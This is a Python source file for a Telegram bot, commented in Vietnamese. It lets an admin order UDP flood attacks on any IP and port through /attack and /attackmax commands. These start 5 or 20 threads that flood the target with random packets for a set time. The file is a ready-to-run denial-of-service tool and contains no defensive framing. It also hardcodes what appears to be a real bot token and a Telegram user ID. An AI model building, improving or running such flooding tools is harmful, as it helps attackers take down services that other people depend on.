import telebot
import threading
import time
import socket
import random

# === Cấu hình ===
TOKEN = "8064257148:AAH6DfA-DrE_pS60OBfOj1JsDYOKKdLtmdc"  # ← Dán token từ @BotFather
ADMIN_ID = 6821953959  # ← Dán Telegram user ID (lấy bằng /myid)

bot = telebot.TeleBot(TOKEN)

# === Hàm tấn công UDP ===
def udp_attack(ip, port, duration, counter, pps):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    while time.time() < timeout:
        try:
            for _ in range(pps):
                sock.sendto(data, (ip, port))
                counter[0] += 1
        except:
            pass

# === /start ===
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "Gửi `/attack ip port thời_gian` hoặc `/attackmax ip port thời_gian` để bắt đầu.", parse_mode='Markdown')

# === /myid ===
@bot.message_handler(commands=['myid'])
def myid(message):
    bot.reply_to(message, f"ID của bạn là: `{message.from_user.id}`", parse_mode='Markdown')

# === /attack thường ===
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Bạn không có quyền.")
        return

    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            raise ValueError()

        ip = args[0]
        port = int(args[1])
        duration = int(args[2])

        bot.reply_to(message, f"Đang gửi UDP tới {ip}:{port} trong {duration}s (5 luồng × 50)...")

        counter = [0]
        for _ in range(5):
            threading.Thread(target=udp_attack, args=(ip, port, duration, counter, 50)).start()

        def done():
            time.sleep(duration)
            bot.send_message(message.chat.id, f"Tấn công kết thúc. Tổng packet gửi: {counter[0]}")

        threading.Thread(target=done).start()

    except:
        bot.reply_to(message, "Sai cú pháp. Dùng: `/attack ip port thời_gian`", parse_mode='Markdown')

# === /attackmax mạnh ===
@bot.message_handler(commands=['attackmax'])
def handle_attackmax(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Bạn không có quyền sử dụng chế độ max.")
        return

    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            raise ValueError()

        ip = args[0]
        port = int(args[1])
        duration = int(args[2])

        bot.reply_to(message, f"MAX POWER: Gửi UDP tới {ip}:{port} trong {duration}s (20 luồng × 100)...")

        counter = [0]
        for _ in range(20):
            threading.Thread(target=udp_attack, args=(ip, port, duration, counter, 100)).start()

        def done():
            time.sleep(duration)
            bot.send_message(message.chat.id, f"Tấn công mạnh kết thúc. Tổng packet gửi: {counter[0]}")

        threading.Thread(target=done).start()

    except:
        bot.reply_to(message, "Sai cú pháp. Dùng: `/attackmax ip port thời_gian`", parse_mode='Markdown')

# === Chạy bot ===
if __name__ == '__main__':
    print("Bot đang chạy...")
    bot.infinity_polling()
